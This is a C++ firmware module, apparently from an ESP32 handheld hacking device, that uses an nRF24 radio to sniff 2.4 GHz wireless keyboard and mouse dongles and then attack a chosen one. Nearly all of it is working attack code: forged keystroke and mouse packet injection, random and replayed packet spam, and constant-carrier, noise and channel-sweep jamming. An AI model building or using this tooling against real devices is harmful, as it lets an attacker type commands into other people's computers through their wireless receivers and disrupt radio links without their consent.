#include "nrf_hijack.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "nrf_common.h"
#include "nrf_sniffer.h"
#include <globals.h>
#include <algorithm>
#include <cstring>
#include <esp_system.h>
#include <functional>
#include <vector>

namespace {
String hexPayload(const uint8_t *p, uint8_t len) {
    String out;
    for (uint8_t i = 0; i < len; ++i) {
        char buf[3];
        snprintf(buf, sizeof(buf), "%02X", p[i]);
        out += buf;
    }
    return out;
}

struct Target {
    uint8_t addr[5];
    uint8_t channel;
    uint8_t sample[32];
    uint8_t sampleLen;
    String vendor;
    String type;
};

struct UiFrame {
    int headerY = 6;
    int listY = 44;
    int footerY = 152;
    int listH = 106;
    int rowH = 16;
    int maxRows() const { return (listH / rowH); }
};

struct ScanProfile {
    const char *name;
    rf24_datarate_e rate;
    uint8_t addrWidth;
    bool crcOn;
    uint64_t pipes[6];
};

String addrToString(const uint8_t a[5]) {
    char buf[16];
    snprintf(buf, sizeof(buf), "%02X%02X%02X%02X%02X", a[0], a[1], a[2], a[3], a[4]);
    return String(buf);
}

bool parseAddr(const String &hex, uint8_t out[5]) {
    if (hex.length() < 10) return false;
    for (int i = 0; i < 5; ++i) {
        char hi = hex[i * 2];
        char lo = hex[i * 2 + 1];
        auto toVal = [](char c) -> int {
            if (c >= '0' && c <= '9') return c - '0';
            if (c >= 'a' && c <= 'f') return c - 'a' + 10;
            if (c >= 'A' && c <= 'F') return c - 'A' + 10;
            return -1;
        };
        int v1 = toVal(hi);
        int v2 = toVal(lo);
        if (v1 < 0 || v2 < 0) return false;
        out[i] = (uint8_t)((v1 << 4) | v2);
    }
    return true;
}

uint8_t clampChan(int c) {
    if (c < 1) return 1;
    if (c > 125) return 125;
    return (uint8_t)c;
}

// Minimal vendor guess
std::pair<String, String> guessVendor(const uint8_t a[5]) {
    struct Prefix {
        uint8_t p0;
        uint8_t p1;
        const char *vendor;
        const char *type;
    };
    static const Prefix prefixes[] = {
        {0xE7, 0xE7, "Nordic", "Default"},
        {0xC2, 0xC2, "Logitech?", "HID Dongle"},
        {0xAA, 0xAA, "Toy/Clone", "SimpleTX"},
        {0x55, 0x55, "Generic", "Unknown"},
    };
    for (const auto &p : prefixes) {
        if (a[0] == p.p0 && a[1] == p.p1) return {p.vendor, p.type};
    }
    return {"Unknown", "Unknown"};
}

void drawPickHeader(const char *title) {
    drawMainBorder();
    tft.setCursor(10, 8);
    tft.setTextSize(FM);
    tft.println(title);
    tft.setCursor(10, 30);
}

// HID helpers
bool asciiToHid(char c, uint8_t &mod, uint8_t &key) {
    mod = 0;
    if (c >= 'a' && c <= 'z') {
        key = 0x04 + (c - 'a');
        return true;
    }
    if (c >= 'A' && c <= 'Z') {
        key = 0x04 + (c - 'A');
        mod = 0x02; // left shift
        return true;
    }
    if (c >= '1' && c <= '9') {
        key = 0x1E + (c - '1');
        return true;
    }
    if (c == '0') {
        key = 0x27;
        return true;
    }
    if (c == ' ') {
        key = 0x2C;
        return true;
    }
    if (c == '\n' || c == '\r') {
        key = 0x28;
        return true;
    }
    if (c == '.') {
        key = 0x37;
        return true;
    }
    if (c == ',') {
        key = 0x36;
        return true;
    }
    if (c == '-') {
        key = 0x2D;
        return true;
    }
    if (c == '=') {
        key = 0x2E;
        return true;
    }
    if (c == '/') {
        key = 0x38;
        return true;
    }
    return false; // unsupported char
}

char hidToAscii(uint8_t mod, uint8_t key) {
    const bool shift = mod & 0x02;
    if (key >= 0x04 && key <= 0x1D) { // letters
        char base = shift ? 'A' : 'a';
        return static_cast<char>(base + (key - 0x04));
    }
    if (key >= 0x1E && key <= 0x27) {
        const char digits[] = {'1','2','3','4','5','6','7','8','9','0'};
        return digits[key - 0x1E];
    }
    if (key == 0x28) return '\n';
    if (key == 0x2C) return ' ';
    if (key == 0x2D) return '-';
    if (key == 0x2E) return '=';
    if (key == 0x36) return shift ? '?' : ',';
    if (key == 0x37) return '.';
    if (key == 0x38) return '/';
    return '?';
}

String decodeSample(const Target &t) {
    if (t.sampleLen >= 4 && t.sampleLen < 8) {
        int8_t dx = (int8_t)t.sample[1];
        int8_t dy = (int8_t)t.sample[2];
        uint8_t btn = t.sample[0];
        String out = "Mouse btn:";
        out += String(btn, DEC);
        out += " dx:";
        out += String(dx);
        out += " dy:";
        out += String(dy);
        return out;
    }
    if (t.sampleLen >= 8) {
        uint8_t mod = t.sample[0];
        uint8_t key = t.sample[2];
        char c = hidToAscii(mod, key);
        String out = "HID key: ";
        out += c;
        out += " (mod ";
        out += String(mod);
        out += ")";
        return out;
    }
    return "Unknown sample";
}

void logDiscovery(const NrfSniffedDevice &d) {
    String line = "CH " + String(d.channel) + " " + addrToString(d.addr) + " hits=" + String(d.hits) +
                  " pipe=" + String(d.pipe) + " len=" + String(d.sampleLen);
    Serial.println("[NRF] " + line);
    FS *fs = nullptr;
    if (getFsStorage(fs) && fs) {
        File f = fs->open("/nrf_scan.log", FILE_APPEND);
        if (f) {
            f.println(line);
            f.close();
        }
    }
}

void renderDeviceDetail(const NrfSniffedDevice &d, size_t idx, size_t total) {
    drawPickHeader("Inspect packets");
    tft.setTextSize(FM);
    tft.printf("#%u/%u CH%u\n", (unsigned)(idx + 1), (unsigned)total, d.channel);
    tft.printf("Addr: %s\n", addrToString(d.addr).c_str());
    tft.printf("Hits: %lu Pipe:%u\n", (unsigned long)d.hits, (unsigned)d.pipe);
    if (d.sampleLen) {
        tft.printf("Len:%u %s\n", d.sampleLen, hexPayload(d.sample, d.sampleLen).c_str());
    } else {
        tft.println("No payload yet");
    }
    Target tmp{};
    memcpy(tmp.addr, d.addr, 5);
    tmp.channel = d.channel;
    tmp.sampleLen = d.sampleLen;
    if (d.sampleLen > 0 && d.sampleLen <= 32) memcpy(tmp.sample, d.sample, d.sampleLen);
    tft.println(decodeSample(tmp));
    tft.println("Sel=pick  Esc=back");
}

bool addOrUpdate(
    std::vector<NrfSniffedDevice> &devices, const uint8_t fullAddr[5], uint8_t channel, uint8_t pipe,
    const uint8_t *payload, uint8_t len
) {
    auto vend = guessVendor(fullAddr);
    auto it = std::find_if(devices.begin(), devices.end(), [&](const NrfSniffedDevice &x) {
        return memcmp(x.addr, fullAddr, 5) == 0;
    });
    if (it == devices.end()) {
        NrfSniffedDevice d{};
        memcpy(d.addr, fullAddr, 5);
        d.channel = channel;
        d.pipe = pipe;
        d.sampleLen = len;
        if (len > 0 && len <= 32 && payload) memcpy(d.sample, payload, len);
        d.firstSeen = millis();
        d.lastSeen = d.firstSeen;
        d.hits = 1;
        d.vendor = vend.first;
        d.type = vend.second;
        devices.push_back(d);
        return true;
    } else {
        it->hits++;
        it->channel = channel;
        it->pipe = pipe;
        it->lastSeen = millis();
        if (len > 0 && len <= 32 && payload) {
            it->sampleLen = len;
            memcpy(it->sample, payload, len);
        }
        if (it->vendor == "Unknown") {
            it->vendor = vend.first;
            it->type = vend.second;
        }
    }
    return false;
}

Target manualTarget() {
    Target t{};
    drawPickHeader("Manual target");
    tft.println("Enter 5-byte addr (hex):");
    String hex = keyboard("", 12, "ADDR (e.g. C2C2C2C2C2)");
    if (!parseAddr(hex, t.addr)) return {};
    tft.println("Channel 1-125 (default 2)");
    String chStr = keyboard("2", 3, "Channel (1-125)");
    t.channel = clampChan(chStr.toInt());
    t.sampleLen = 0;
    t.vendor = "Manual";
    t.type = "User";
    return t;
}

Target pickFromSniffer() {
    static const ScanProfile profiles[] = {
        {"Wide (AW2 1M)",   RF24_1MBPS, 2, false, {0xE7E7, 0xC2C2, 0xAFAF, 0xAAAA, 0x5555, 0xFFFF}},
        {"ESB (AW5 1M)",    RF24_1MBPS, 5, false, {0xE7E7E7E7E7ULL, 0xC2C2C2C2C2ULL, 0xAFAFAFAFAFULL, 0xAAAAAAAAAAULL, 0x5555555555ULL, 0xFFFFFFFFFFULL}},
        {"Logi (AW5 2M)",   RF24_2MBPS, 5, false, {0xC2C2C2C2C2ULL, 0xA3A3A3A3A3ULL, 0xE7E7E7E7E7ULL, 0xAAAAAAAAAAULL, 0x5555555555ULL, 0xFFFFFFFFFFULL}},
    };
    auto applyProfile = [&](const ScanProfile &p) {
        NRFradio.stopListening();
        NRFradio.setAutoAck(false);
        if (p.crcOn) NRFradio.setCRCLength(RF24_CRC_16);
        else NRFradio.disableCRC();
        NRFradio.enableDynamicPayloads();
        NRFradio.setPayloadSize(32);
        NRFradio.setAddressWidth(p.addrWidth);
        NRFradio.setPALevel(RF24_PA_MAX);
        NRFradio.setDataRate(p.rate);
        for (uint8_t i = 0; i < 6; ++i) { NRFradio.openReadingPipe(i, p.pipes[i]); }
        NRFradio.flush_rx();
        NRFradio.startListening();
    };

    Target t{};
    drawPickHeader("Sniffer: scanning...");
    tft.setTextSize(FM);
    tft.println("Scanning live...");

    std::vector<NrfSniffedDevice> devices;
    uint8_t channel = 2;
    size_t idx = 0;
    int lastDraw = -1;
    unsigned long lastUi = 0;
    size_t profileIdx = 0;
    UiFrame frame;

    applyProfile(profiles[profileIdx]);

    while (true) {
        // hop + collect
        NRFradio.setChannel(channel);
        NRFradio.flush_rx();
        unsigned long listenStart = millis();
        while (millis() - listenStart < 25) {
            uint8_t pipe = 0;
            while (NRFradio.available(&pipe)) {
                uint8_t len = NRFradio.getDynamicPayloadSize();
                if (len == 0 || len > 32) {
                    NRFradio.flush_rx();
                    break;
                }
                uint8_t payload[32];
                NRFradio.read(payload, len);
                uint8_t fullAddr[5] = {0xFF, 0xFF, payload[0], payload[1], payload[2]};
                if (addOrUpdate(devices, fullAddr, channel, pipe, payload, len)) { logDiscovery(devices.back()); }
            }
        }
        channel = (channel >= 125) ? 1 : (channel + 1);

        // render list periodically
        bool changed = false;
        static size_t lastCount = 0;
        if (devices.size() != lastCount) {
            lastDraw = -1;
            lastCount = devices.size();
            changed = true;
        }

        if (millis() - lastUi > 1500 || changed) {
            std::vector<NrfSniffedDevice> sorted = devices;
            std::sort(sorted.begin(), sorted.end(), [](const NrfSniffedDevice &a, const NrfSniffedDevice &b) {
                return a.hits > b.hits;
            });
            if (idx >= sorted.size()) idx = sorted.empty() ? 0 : sorted.size() - 1;
            if ((int)idx != lastDraw) {
                drawPickHeader("Select target");
                tft.setTextSize(FP);
                const uint16_t rowH = frame.rowH;
                const size_t maxList = frame.maxRows();
                const size_t start = (idx / maxList) * maxList;
                const size_t end = std::min(start + maxList, sorted.size());

                tft.setCursor(10, frame.headerY + 22);
                tft.printf("Prof:%s", profiles[profileIdx].name);
                tft.setCursor(10, frame.headerY + 40);
                tft.printf("Found: %u", (unsigned)sorted.size());
                // clear list area
                tft.fillRect(8, frame.listY, tftWidth - 16, frame.listH, bruceConfig.bgColor);
                int y = frame.listY + 2;
                if (sorted.empty()) {
                    tft.setCursor(10, y);
                    tft.print("No devices yet...");
                    y += rowH;
                } else {
                    for (size_t i = start; i < end; ++i) {
                        const auto &d = sorted[i];
                        tft.setCursor(10, y);
                        tft.print((i == idx) ? ">" : " ");
                        tft.printf("%02u CH%3u %s", (unsigned)(i + 1), d.channel, addrToString(d.addr).c_str());
                        y += rowH;
                        tft.setCursor(20, y);
                        tft.printf("Hits:%lu", (unsigned long)d.hits);
                        y += rowH;
                    }
                }
                tft.fillRect(8, frame.footerY, tftWidth - 16, 30, bruceConfig.bgColor);
                tft.setCursor(10, frame.footerY);
                tft.print("Prev/Next browse   Esc=back");
                tft.setCursor(10, frame.footerY + 14);
                tft.print("Sel=inspect  Prof=LongPrev");
                lastDraw = (int)idx;
            }
            lastUi = millis();
        }

        if (check(NextPress)) {
            idx = devices.empty() ? 0 : (idx + 1) % devices.size();
            lastDraw = -1;
            delay(120);
        } else if (check(PrevPress) && check(LongPress)) {
            profileIdx = (profileIdx + 1) % (sizeof(profiles) / sizeof(profiles[0]));
            applyProfile(profiles[profileIdx]);
            lastDraw = -1;
            delay(200);
        } else if (check(PrevPress)) {
            if (!devices.empty()) idx = (idx == 0) ? devices.size() - 1 : idx - 1;
            lastDraw = -1;
            delay(120);
        } else if (check(SelPress)) {
            if (!devices.empty()) {
                std::vector<NrfSniffedDevice> sorted = devices;
                std::sort(sorted.begin(), sorted.end(), [](const NrfSniffedDevice &a, const NrfSniffedDevice &b) {
                    return a.hits > b.hits;
                });
                if (idx >= sorted.size()) idx = sorted.size() - 1;
                size_t inspectIdx = idx;
                bool pick = false;
                while (true) {
                    renderDeviceDetail(sorted[inspectIdx], inspectIdx, sorted.size());
                    if (check(SelPress)) {
                        pick = true;
                        idx = inspectIdx;
                        break;
                    }
                    if (check(EscPress)) break;
                    if (check(NextPress)) {
                        inspectIdx = (inspectIdx + 1) % sorted.size();
                        delay(100);
                    } else if (check(PrevPress)) {
                        inspectIdx = (inspectIdx == 0) ? sorted.size() - 1 : inspectIdx - 1;
                        delay(100);
                    }
                }
                if (pick) {
                    const auto &d = sorted[inspectIdx];
                    memcpy(t.addr, d.addr, 5);
                    t.channel = d.channel;
                    t.sampleLen = d.sampleLen;
                    if (d.sampleLen > 0 && d.sampleLen <= 32) memcpy(t.sample, d.sample, d.sampleLen);
                    t.vendor = d.vendor;
                    t.type = d.type;
                    NRFradio.stopListening();
                    return t;
                }
                lastDraw = -1;
            }
        } else if (check(EscPress)) {
            NRFradio.stopListening();
            return {};
        }
    }
}

Target pickTarget() {
    int menuIdx = 0;
    const char *opts[] = {"Sniffer list", "Manual entry", "Back"};
    int lastDraw = -1;
    while (true) {
        if (menuIdx != lastDraw) {
            drawPickHeader("Pick target");
            tft.setTextSize(FM);
            for (int i = 0; i < 3; ++i) {
                tft.print((i == menuIdx) ? ">" : " ");
                tft.print(" ");
                tft.println(opts[i]);
            }
            lastDraw = menuIdx;
        }
        if (check(NextPress)) {
            menuIdx = (menuIdx + 1) % 3;
            delay(150);
        }
        if (check(PrevPress)) {
            menuIdx = (menuIdx + 2) % 3;
            delay(150);
        }
        if (check(SelPress)) {
            if (menuIdx == 0) return pickFromSniffer();
            if (menuIdx == 1) return manualTarget();
            return {};
        }
        if (check(EscPress)) return {};
    }
}

void sendPayload(const uint8_t *data, uint8_t len, uint8_t repeats = 3) {
    for (uint8_t i = 0; i < repeats; ++i) {
        NRFradio.write(data, len);
        delay(4);
    }
}

void configureTx(uint8_t channel, const uint8_t addr[5]) {
    NRFradio.stopListening();
    NRFradio.setAutoAck(false);
    NRFradio.setPALevel(RF24_PA_MAX);
    NRFradio.setAddressWidth(5);
    NRFradio.setChannel(channel);
    NRFradio.setDataRate(RF24_2MBPS); // common for Logitech-style dongles
    NRFradio.enableDynamicPayloads();
    NRFradio.openWritingPipe(addr);
}

void keyboardInject(const Target &t) {
    configureTx(t.channel, t.addr);
    String text = keyboard("", 64, "Text to inject:");
    if (text == "\x1B" || text.length() == 0) return;

    drawPickHeader("Keyboard Inject");
        tft.printf("Addr %s\n", addrToString(t.addr).c_str());
        tft.printf("Ch %u Typing...\n", t.channel);

        for (size_t i = 0; i < text.length(); ++i) {
            uint8_t mod = 0, key = 0;
        if (!asciiToHid(text[i], mod, key)) continue;

        uint8_t pkt[8] = {mod, 0, key, 0, 0, 0, 0, 0};
        sendPayload(pkt, sizeof(pkt));
        uint8_t rel[8] = {0};
        sendPayload(rel, sizeof(rel));
    }

    tft.println("Done. Esc to exit");
    while (!check(EscPress)) delay(50);
}

void mouseInject(const Target &t) {
    configureTx(t.channel, t.addr);
    drawPickHeader("Mouse Inject");
    String dxStr = keyboard("5", 4, "Move X (-127..127)");
    String dyStr = keyboard("0", 4, "Move Y (-127..127)");
    String clickStr = keyboard("y", 1, "Left click? (y/n)");

    int dx = dxStr.toInt();
    int dy = dyStr.toInt();
    bool click = (clickStr.length() > 0 && (clickStr[0] == 'y' || clickStr[0] == 'Y'));

    uint8_t btn = click ? 0x01 : 0x00;
    uint8_t pkt[8] = {btn, (uint8_t)dx, (uint8_t)dy, 0, 0, 0, 0, 0};

    tft.printf("Addr %s\n", addrToString(t.addr).c_str());
    tft.printf("Ch %u Send mouse...\n", t.channel);
    sendPayload(pkt, sizeof(pkt), 5);
    uint8_t release[8] = {0};
    sendPayload(release, sizeof(release), 3);

    tft.println("Done. Esc to exit");
    while (!check(EscPress)) delay(50);
}

void spamRandom(const Target &t) {
    configureTx(t.channel, t.addr);
    drawPickHeader("Spam random");
    tft.printf("Addr %s\n", addrToString(t.addr).c_str());
    tft.printf("Ch %u ESC=stop\n", t.channel);

    uint8_t buf[32];
    while (!check(EscPress)) {
        uint8_t len = 4 + (esp_random() % 28);
        for (uint8_t i = 0; i < len; ++i) buf[i] = (uint8_t)esp_random();
        sendPayload(buf, len, 1);
    }
}

void spamSample(const Target &t) {
    if (t.sampleLen == 0) {
        displayError("No sample payload");
        delay(600);
        return;
    }
    configureTx(t.channel, t.addr);
    drawPickHeader("Spam sample");
    tft.printf("Addr %s\n", addrToString(t.addr).c_str());
    tft.printf("Ch %u ESC=stop\n", t.channel);

    while (!check(EscPress)) { sendPayload(t.sample, t.sampleLen, 1); }
}

void carrierJam(const Target &t) {
    NRFradio.stopListening();
    NRFradio.setChannel(t.channel);
    NRFradio.startConstCarrier(RF24_PA_MAX, t.channel);
    drawPickHeader("Carrier Jam");
    tft.printf("Ch %u carrier on\n", t.channel);
    tft.println("ESC to stop");
    while (!check(EscPress)) delay(20);
    NRFradio.stopConstCarrier();
}

void hybridNoise(const Target &t) {
    configureTx(t.channel, t.addr);
    bool carrier = false;
    unsigned long lastToggle = 0;
    drawPickHeader("Carrier + Noise");
    tft.printf("Ch %u alternating\n", t.channel);
    tft.println("ESC to stop");

    while (!check(EscPress)) {
        unsigned long now = millis();
        if (now - lastToggle > 15) {
            if (carrier) {
                NRFradio.stopConstCarrier();
                carrier = false;
            } else {
                NRFradio.startConstCarrier(RF24_PA_MAX, t.channel);
                carrier = true;
            }
            lastToggle = now;
        }

        if (!carrier) {
            uint8_t buf[32];
            uint8_t len = 8;
            for (uint8_t i = 0; i < len; ++i) buf[i] = (uint8_t)esp_random();
            sendPayload(buf, len, 1);
        }
    }
    if (carrier) NRFradio.stopConstCarrier();
}

void sweepJamInternal(int startCh, int stopCh, int step, int dwellMs, bool noise) {
    if (startCh <= 0 || stopCh <= 0 || step <= 0) return;
    if (dwellMs < 1) dwellMs = 1;
    NRFradio.stopListening();
    NRFradio.setAutoAck(false);
    NRFradio.setPALevel(RF24_PA_MAX);
    NRFradio.setAddressWidth(5);
    NRFradio.setDataRate(RF24_1MBPS);
    NRFradio.enableDynamicPayloads();

    int ch = startCh;
    while (!check(EscPress)) {
        if (ch > stopCh) ch = startCh;
        if (noise) {
            uint8_t buf[8];
            for (uint8_t i = 0; i < 8; ++i) buf[i] = (uint8_t)esp_random();
            NRFradio.setChannel(ch);
            NRFradio.writeFast(buf, sizeof(buf));
        } else {
            NRFradio.startConstCarrier(RF24_PA_MAX, ch);
            delay(dwellMs);
            NRFradio.stopConstCarrier();
        }
        delay(dwellMs);
        ch += step;
    }
}

void sweepJamPrompt() {
    drawPickHeader("Sweep Jam");
    int startCh = keyboard("1", 3, "Start CH").toInt();
    int stopCh = keyboard("80", 3, "Stop CH").toInt();
    int step = keyboard("2", 2, "Step").toInt();
    int dwell = keyboard("60", 3, "Dwell ms").toInt();
    bool noise = false;
    String mode = keyboard("n", 1, "Noise (y/n)");
    noise = (mode.length() && (mode[0] == 'y' || mode[0] == 'Y'));
    sweepJamInternal(startCh, stopCh, step, dwell, noise);
}
} // namespace

void nrf_hijack() {
    if (!nrf_start()) {
        Serial.println("Fail Starting radio");
        displayError("NRF24 not found");
        delay(500);
        return;
    }

    Target target = pickTarget();
    if (target.addr[0] == 0 && target.addr[1] == 0 && target.addr[2] == 0 && target.addr[3] == 0 &&
        target.addr[4] == 0) {
        return;
    }

    configureTx(target.channel, target.addr);

    int modeIdx = 0;
    const int modeCount = 8;
    const char *modes[modeCount] = {
        "Keyboard", "Mouse", "Spam random", "Spam sample", "Carrier jam", "Carrier+noise", "Sweep jam", "Back"
    };
    int lastDraw = -1;
    while (true) {
        if (modeIdx != lastDraw) {
            drawPickHeader("Hijack mode");
            tft.setTextSize(FM);
            for (int i = 0; i < modeCount; ++i) {
                tft.print((i == modeIdx) ? ">" : " ");
                tft.print(" ");
                tft.println(modes[i]);
            }
            lastDraw = modeIdx;
        }

        if (check(NextPress)) {
            modeIdx = (modeIdx + 1) % modeCount;
            delay(120);
        } else if (check(PrevPress)) {
            modeIdx = (modeIdx + modeCount - 1) % modeCount;
            delay(120);
        } else if (check(SelPress)) {
            if (modeIdx == 0) keyboardInject(target);
            else if (modeIdx == 1) mouseInject(target);
            else if (modeIdx == 2) spamRandom(target);
            else if (modeIdx == 3) spamSample(target);
            else if (modeIdx == 4) carrierJam(target);
            else if (modeIdx == 5) hybridNoise(target);
            else if (modeIdx == 6) sweepJamPrompt();
            else break;
            configureTx(target.channel, target.addr); // reapply TX config after disruptive modes
        } else if (check(EscPress)) {
            break;
        }
    }

    NRFradio.powerDown();
}

void nrf_sweep_jam(int startCh, int stopCh, int step, int dwellMs, bool noise) {
    sweepJamInternal(startCh, stopCh, step, dwellMs, noise);
}

void nrf_toolkit() { nrf_hijack(); }
